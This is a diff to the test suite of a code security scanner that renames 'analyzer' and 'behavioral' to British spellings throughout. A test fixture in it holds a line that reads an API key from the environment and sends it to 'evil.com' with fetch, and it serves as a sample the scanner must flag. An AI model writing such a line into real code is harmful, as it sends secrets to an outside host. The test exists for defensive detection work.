@@ -28,7 +28,7 @@ describe('ScanOrchestrator', () => {
       assert.ok(result.summary.includes('No security issues'));
     });
 
-    it('should detect threats across analyzers', async () => {
+    it('should detect threats across analysers', async () => {
       const orchestrator = new ScanOrchestrator();
       const code = `
 const secret = process.env.API_KEY;
@@ -40,18 +40,18 @@ fetch("https://evil.com", { body: secret });
 
       assert.ok(result.findings.length > 0);
       assert.ok(result.risk_level === 'high' || result.risk_level === 'critical');
-      // Should have findings from both static and behavioral
-      const analyzers = new Set(result.findings.map((f) => f.analyzer));
-      assert.ok(analyzers.has('static'), 'Should have static findings');
-      assert.ok(analyzers.has('behavioral'), 'Should have behavioral findings');
+      // Should have findings from both static and behavioural
+      const analysers = new Set(result.findings.map((f) => f.analyser));
+      assert.ok(analysers.has('static'), 'Should have static findings');
+      assert.ok(analysers.has('behavioural'), 'Should have behavioural findings');
     });
 
-    it('should include metadata with analyzers used', async () => {
+    it('should include metadata with analysers used', async () => {
       const orchestrator = new ScanOrchestrator();
       const files = [makeFile('test.ts', 'exec("ls");')];
       const result = await orchestrator.run('/scan-root', files);
 
-      assert.ok(result.metadata.analyzers_used.includes('static'));
+      assert.ok(result.metadata.analysers_used.includes('static'));
       assert.ok(result.metadata.files_scanned === 1);
       assert.ok(result.metadata.scan_duration_ms >= 0);
       assert.ok(result.metadata.scan_time);
@@ -78,7 +78,7 @@ fetch("https://evil.com", { body: secret });
       const result = await orchestrator.run('/scan-root', files);
 
       // findings and evidence should be consistent
-      const staticFindings = result.findings.filter((f) => f.analyzer === 'static');
+      const staticFindings = result.findings.filter((f) => f.analyser === 'static');
       // At minimum, evidence should contain entries from static findings
       assert.ok(staticFindings.length > 0);
       assert.ok(result.evidence.length > 0);
@@ -108,29 +108,29 @@ fetch("https://evil.com", { body: secret });
       const files = [makeFile('test.ts', code)];
       const result = await orchestrator.run('/scan-root', files);
 
-      // Only static analyzer should run (behavioral disabled)
-      const analyzers = new Set(result.findings.map((f) => f.analyzer));
-      if (analyzers.size > 0) {
-        assert.ok(!analyzers.has('behavioral'), 'Behavioral should be disabled in permissive');
+      // Only static analyser should run (behavioural disabled)
+      const analysers = new Set(result.findings.map((f) => f.analyser));
+      if (analysers.size > 0) {
+        assert.ok(!analysers.has('behavioural'), 'Behavioural should be disabled in permissive');
       }
     });
 
-    it('should disable behavioral when policy says so', async () => {
+    it('should disable behavioural when policy says so', async () => {
       const policy = mergePolicy(defaultPolicy(), {
-        analyzers: { static: true, behavioral: false, llm: false },
+        analysers: { static: true, behavioural: false, llm: false },
       });
       const orchestrator = new ScanOrchestrator({ policy });
       const files = [makeFile('test.ts', 'exec("ls");')];
       const result = await orchestrator.run('/scan-root', files);
 
-      assert.ok(!result.metadata.analyzers_used.includes('behavioral'));
+      assert.ok(!result.metadata.analysers_used.includes('behavioural'));
     });
   });
 
   describe('deduplication', () => {
-    it('should deduplicate overlapping findings from different analyzers', async () => {
+    it('should deduplicate overlapping findings from different analysers', async () => {
       const orchestrator = new ScanOrchestrator();
-      // This code will trigger both static SHELL_EXEC and behavioral findings
+      // This code will trigger both static SHELL_EXEC and behavioural findings
       const files = [makeFile('test.ts', 'exec("ls -la");')];
       const result = await orchestrator.run('/scan-root', files);
 
